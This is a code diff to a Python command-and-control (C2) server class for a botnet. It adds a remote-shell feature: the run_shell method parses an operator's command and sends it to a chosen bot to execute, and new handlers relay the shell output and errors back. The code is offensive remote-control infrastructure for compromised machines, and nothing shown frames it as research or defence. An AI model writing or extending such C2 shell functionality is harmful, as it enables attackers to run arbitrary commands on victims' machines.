@@ -1,3 +1,4 @@
+import shlex
 import logging
 import datetime
 
@@ -15,6 +16,9 @@ class C2Server(QBalancedServer):
     task = Signal(Task)
     info = Signal(Info)
     assigned = Signal(int, str, int)
+
+    shell_error = Signal(int, str)
+    shell_output = Signal(int, str)
 
     def __init__(self):
         super(C2Server, self).__init__(loggerName=self.__class__.__name__)
@@ -76,6 +80,13 @@ class C2Server(QBalancedServer):
                 self.logger.warning("Assigned keys do not match! Bot {} will be kicked!".format(bot_id))
                 self.kick(bot_id)
 
+        elif event_type == "shell":
+            event = message.get("event")
+            if event == "error":
+                self.shell_error.emit(bot_id, message.get("error"))
+            elif event == "output":
+                self.shell_output.emit(bot_id, str(message.get("output")))
+
         else:
             self.logger.error("BOT-{}: Failed to find matching event type for {}".format(bot.get_id(), message))
         self.message.emit(bot_id, message)
@@ -130,4 +141,17 @@ class C2Server(QBalancedServer):
 
     @Slot(int, int)
     def stop_task(self, bot_id, task_id):
-        self.write(bot_id, {"event_type": "task", "bot_id": bot_id, "event": "stop", "task_id": task_id})
+        self.write(bot_id, {"event_type": "task", "event": "stop", "task_id": task_id})
+
+    @Slot(int, str)
+    def run_shell(self, bot_id, command):
+        try:
+            if not command:
+                raise Exception("command cannot be an empty string")
+            command = shlex.split(command.replace("\\", "\\\\"))
+            args = []
+            if len(command) > 1:
+                args = command[1:]
+            self.write(bot_id, {"event_type": "shell", "event": "run", "command": command[0], "args": args})
+        except Exception as e:
+            self.shell_error.emit(bot_id, "Failed to execute command {}: {}".format(command, e))
